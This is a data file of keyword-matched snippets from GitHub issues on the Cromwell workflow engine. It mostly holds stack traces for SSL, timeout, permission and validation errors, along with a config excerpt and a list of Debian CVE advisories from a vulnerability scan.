Security,.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.g,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8276,secur,security,8276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,".; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""service-account""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""service-account"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""europe-west4"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration tu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:13000,access,access,13000,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['access'],['access']
Security,".DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:208); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Optional value was not set and no 'default' attribute was provided; Optional value was not set and no 'default' attribute was provided; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:534); ... 39 common frames omitted. ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATE",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:5431,Validat,Validation,5431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,2,['Validat'],"['Validation', 'ValidationTry']"
Security,.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$arou,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:3840,hash,hashGivenDockerHash,3840,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['hash'],['hashGivenDockerHash']
Security,.WorkflowActor.fetchLocallyQualifiedInputs(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$processRunnableCall(WorkflowActor.scala:1254) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:868) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467) ~[cromwell.jar:0.19]; at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36) ~[cromwell.jar:0.19]; at akka.actor.FSM$class.processEvent(FSM.scala:604) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236) ~[cromwell.jar:0.19]; at akka.actor.LoggingFSM$class.processEvent(FSM.scala:734) ~[cromwell.jar:0.1,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:5967,Hash,HashMap,5967,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,".c in Mercurial before 4.6.1 mishandles integer addition and subtraction, aka OVE-20180430-0002.; https://security-tracker.debian.org/tracker/CVE-2018-13347; -----------------------------------------; CVE-2017-17458: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; In Mercurial before 4.4.1, it is possible that a specially malformed repository can cause Git subrepositories to run arbitrary code in the form of a .git/hooks/post-update script checked into the repository. Typical use of Mercurial prevents construction of such repositories, but they can be created programmatically.; https://security-tracker.debian.org/tracker/CVE-2017-17458; -----------------------------------------; CVE-2017-12562: [High] ; Found in: libsndfile [1.0.27-3]; Fixed By: ; Heap-based Buffer Overflow in the psf_binheader_writef function in common.c in libsndfile through 1.0.28 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact.; https://security-tracker.debian.org/tracker/CVE-2017-12562; -----------------------------------------; CVE-2018-1000001: [High] ; Found in: glibc [2.24-11+deb9u4]; Fixed By: ; In glibc 2.26 and earlier there is confusion in the usage of getcwd() by realpath() which can be used to write before the destination buffer leading to a buffer underflow and potential code execution.; https://security-tracker.debian.org/tracker/CVE-2018-1000001; -----------------------------------------; CVE-2016-2779: [High] ; Found in: util-linux [2.29.2-1+deb9u1]; Fixed By: ; runuser in util-linux allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.; https://security-tracker.debian.org/tracker/CVE-2016-2779; -----------------------------------------; CVE-2017-14062: [High] ; Found in: libidn [1.33-1]; Fixed By: ; Integer overflow in the decode_digit function in puny_decode.c in Libidn2 before 2.0.4 allows remote attackers to cause a d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979:2401,secur,security-tracker,2401,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979,1,['secur'],['security-tracker']
Security,".dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 403 Forbidden; POST https://storage.googleapis.com/upload/storage/v1/b/xxx/o?projection=full&userProject=xxx&uploadType=multipart; {; ""code"" : 403,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project."",; ""reason"" : ""forbidden""; } ],; ""message"" : ""xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.""; }; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:150); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:555); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:475); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:592); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:305); 	... 22 common frames omitted; [2020-07-27 18:34:01,11] [info] WorkflowManagerActor Workflow 3d2d7a27-7c37-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594:3637,access,access,3637,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594,1,['access'],['access']
Security,".dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 403 Forbidden; POST https://storage.googleapis.com/upload/storage/v1/b/xxx/o?projection=full&userProject=xxx&uploadType=multipart; {; ""code"" : 403,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project."",; ""reason"" : ""forbidden""; } ],; ""message"" : ""xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.""; }; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:150); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:555); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:475); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:592); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:305); 	... 22 more; ```. I have no idea what `serviceusage.services.use` is and how to activate it. The tutorial ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594:7547,access,access,7547,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594,1,['access'],['access']
Security,.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:942); 	at cromwell.backe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:6567,validat,validatedRuntimeAttributes,6567,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validatedRuntimeAttributes']
Security,.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:42); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOp,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:7161,validat,validator,7161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['validat'],['validator']
Security,".handler.BaseSyncClientHandler.execute(BaseSyncClientHandler.java:68); cromwell_1 | 	at software.amazon.awssdk.core.client.handler.SdkSyncClientHandler.execute(SdkSyncClientHandler.java:44); cromwell_1 | 	at software.amazon.awssdk.awscore.client.handler.AwsSyncClientHandler.execute(AwsSyncClientHandler.java:55); cromwell_1 | 	at software.amazon.awssdk.services.sts.DefaultStsClient.getCallerIdentity(DefaultStsClient.java:673); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:86); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:76); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:91); cromwell_1 | 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); cromwell_1 | 	at scala.util.Try$.apply(Try.scala:213); cromwell_1 | 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:91); cromwell_1 | 	... 46 more; cromwell_1 | ; cromwell_1 | 2020-03-15 16:09:58,022 cromwell-system-akka.dispatchers.engine-dispatcher-59 INFO - WorkflowManagerActor WorkflowActor-c4ee3308-f9bf-41d2-acdb-70c02b6cc4b3 is in a terminal state: WorkflowFailedState`. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:4588,validat,validateCredential,4588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,1,['validat'],['validateCredential']
Security,".impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at scala.Option.map(Option.scala:146); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1.applyOrElse(FileHashingActor.scala:21); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.callcaching.FileHashingActor.aroundReceive(FileHashingActor.scala:16); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```. Snippet from attached conf file:. ```; ...snip...; local {; // Cromwell makes a link to your input files within <root>/<workflow UUID>/workflow-inputs; // The following are strategies used to make those links. They are ordered. If one fails; // The next one is tried:; //; // hard-link: attempt to create a hard-link to the file; // copy: copy the file; // soft-link: create a symbolic link to the file; //; // NOTE: soft-link will be skipped for Docker jobs; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]; hashing {; strategy: ""path"" ; check-sibling-md5: true; } ; }; ...snip... ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1597:3872,hash,hashing,3872,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1597,1,['hash'],['hashing']
Security,".invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2204,secur,security,2204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,.io.BufferedInputStream.read(BufferedInputStream.java:345); 	at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); 	at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); 	at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:564); 	... 24 more; Caused by: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at sun.security.ssl.Alerts.getSSLException(Alerts.java:208); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1949); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1906); 	at 